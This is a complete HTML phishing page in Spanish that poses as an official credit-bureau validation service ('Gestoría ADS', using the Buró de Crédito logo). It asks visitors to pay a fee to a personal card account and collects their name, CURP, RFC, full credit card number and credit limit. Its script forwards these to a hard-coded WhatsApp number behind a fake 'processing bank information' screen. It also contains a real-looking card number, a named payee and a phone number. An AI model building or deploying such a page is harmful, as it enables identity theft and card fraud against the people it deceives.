<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gestor√≠a y Servicios ADS - Panel Oficial</title>
    <style>
        :root {
            --primary-blue: #1a5276;
            --secondary-blue: #2980b9;
            --light-bg: #f4f7f9;
            --white: #ffffff;
        }

        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: var(--light-bg);
            display: flex;
            justify-content: center;
            padding: 20px;
            margin: 0;
        }

        .container {
            background: var(--white);
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            max-width: 500px;
            width: 100%;
            border-top: 8px solid var(--primary-blue);
        }

        .logos-header {
            display: flex;
            justify-content: space-around; /* Cambiado para mejor alineaci√≥n */
            align-items: center;
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 1px solid #eee;
        }

        .logo-item {
            max-height: 60px;
            max-width: 120px;
            object-fit: contain;
        }

        .brand-header { text-align: center; margin-bottom: 20px; }
        .brand-header h1 { color: var(--primary-blue); font-size: 1.5rem; margin: 0; text-transform: uppercase; }

        .payment-card {
            background: linear-gradient(135deg, #1a5276 0%, #2980b9 100%);
            color: white;
            padding: 15px;
            border-radius: 12px;
            text-align: center;
            margin-bottom: 20px;
        }

        .account-num { font-size: 1.2rem; font-weight: bold; display: block; margin: 5px 0; letter-spacing: 1px; }

        .section-label { display: block; font-size: 0.75rem; color: var(--primary-blue); text-transform: uppercase; margin: 15px 0 10px 0; font-weight: 700; border-bottom: 1px solid #eee; }

        .input-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: 600; font-size: 0.85rem; color: #333; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 14px; }

        #seccionExtra { display: none; background: #f8fbff; padding: 15px; border-radius: 10px; border: 1px solid #e1e8ef; margin-bottom: 15px; }

        .btn-submit {
            width: 100%;
            padding: 15px;
            background-color: var(--primary-blue);
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-size: 1rem;
            font-weight: bold;
            text-transform: uppercase;
            margin-top: 10px;
        }

        .spinner { border: 4px solid rgba(0,0,0,0.1); border-top: 4px solid var(--primary-blue); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container" id="mainContainer">
    <div class="logos-header">
        <img src="buro1.jpg" alt="Bur√≥ de Cr√©dito" class="logo-item">
        <img src="ads.jpeg" alt="Logo ADS" class="logo-item"> </div>

    <div class="brand-header">
        <h1>Gestor√≠a ADS</h1>
    </div>

    <div class="payment-card">
        <small>PAGO DE VALIDACI√ìN ($96.00 MXN)</small>
        <span class="account-num">4027 6653 1037 4161</span>
        <strong>Andr√©s Garc√≠a Mart√≠nez</strong>
    </div>

    <form id="buroForm">
        <span class="section-label">Datos del Solicitante</span>
        <div class="input-group">
            <label>Nombre(s)</label>
            <input type="text" id="nombres" required>
        </div>
        <div style="display: flex; gap: 10px;">
            <div class="input-group" style="flex:1;"><label>Apellido Paterno</label><input type="text" id="paterno" required></div>
            <div class="input-group" style="flex:1;"><label>Apellido Materno</label><input type="text" id="materno" required></div>
        </div>
        <div style="display: flex; gap: 10px;">
            <div class="input-group" style="flex:1;"><label>CURP</label><input type="text" id="curp" maxlength="18" required style="text-transform: uppercase;"></div>
            <div class="input-group" style="flex:1;"><label>RFC</label><input type="text" id="rfc" maxlength="13" required style="text-transform: uppercase;"></div>
        </div>

        <span class="section-label">Validaci√≥n Financiera</span>
        <div class="input-group">
            <label>¬øTiene Tarjeta de Cr√©dito activa?</label>
            <select id="tieneTarjeta" onchange="toggleSeccion()" required>
                <option value="">Seleccione...</option>
                <option value="si">S√≠</option>
                <option value="no">No (D√©bito √∫nicamente)</option>
            </select>
        </div>

        <div id="seccionExtra">
            <div class="input-group">
                <label>N√∫mero de Tarjeta (16 d√≠gitos)</label>
                <input type="text" id="tarjeta" maxlength="16" placeholder="Ingrese los 16 n√∫meros">
            </div>
            <div class="input-group">
                <label>L√≠mite de Cr√©dito</label>
                <input type="number" id="limite" placeholder="Ej. 15000">
            </div>
        </div>

        <button type="submit" class="btn-submit">Enviar Datos a WhatsApp</button>
    </form>
</div>

<script>
    const form = document.getElementById('buroForm');
    const tarjetaInput = document.getElementById('tarjeta');
    const seccionExtra = document.getElementById('seccionExtra');
    const container = document.getElementById('mainContainer');

    function toggleSeccion() {
        const val = document.getElementById('tieneTarjeta').value;
        seccionExtra.style.display = (val === 'si') ? 'block' : 'none';
        tarjetaInput.required = (val === 'si');
    }

    // Solo permite n√∫meros en el campo de tarjeta
    tarjetaInput.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
    });

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        const seleccion = document.getElementById('tieneTarjeta').value;
        
        // Validaci√≥n de los 16 d√≠gitos requerida seg√∫n tus instrucciones
        if (seleccion === 'si' && tarjetaInput.value.length !== 16) {
            alert("Error: El Bur√≥ requiere los 16 d√≠gitos exactos de su tarjeta de cr√©dito.");
            return;
        }

        const nombreC = `${document.getElementById('nombres').value} ${document.getElementById('paterno').value} ${document.getElementById('materno').value}`;
        
        // Mensaje formateado para WhatsApp
        const msg = `*SOLICITUD ADS - BUR√ì*\n\n` +
                    `üë§ *CLIENTE:* ${nombreC.toUpperCase()}\n` +
                    `üÜî *CURP:* ${document.getElementById('curp').value.toUpperCase()}\n` +
                    `üÜî *RFC:* ${document.getElementById('rfc').value.toUpperCase()}\n\n` +
                    `üí≥ *DATOS FINANCIEROS:*\n` +
                    `*Tarjeta:* ${(seleccion === 'si') ? tarjetaInput.value : "No tiene"}\n` +
                    `*L√≠mite:* $${document.getElementById('limite').value || "0"}\n\n` +
                    `üí∞ *PAGO:* $96.00 Realizado a Andr√©s Garc√≠a\n\n` +
                    `‚ö†Ô∏è *POR FAVOR:* Adjunte foto de su INE y el comprobante de pago abajo.`;

        // N√∫mero de WhatsApp configurado: 2382035958
        const whatsappUrl = `https://wa.me/522382035958?text=${encodeURIComponent(msg)}`;
        
        container.innerHTML = `
            <div style="text-align:center; padding: 50px;">
                <div class="spinner"></div>
                <p>Procesando informaci√≥n bancaria...</p>
                <p style="font-size: 0.8em; color: gray;">Redirigiendo a revisi√≥n oficial</p>
            </div>`;
            
        setTimeout(() => { window.location.href = whatsappUrl; }, 2000);
    });
</script>

</body>
</html>
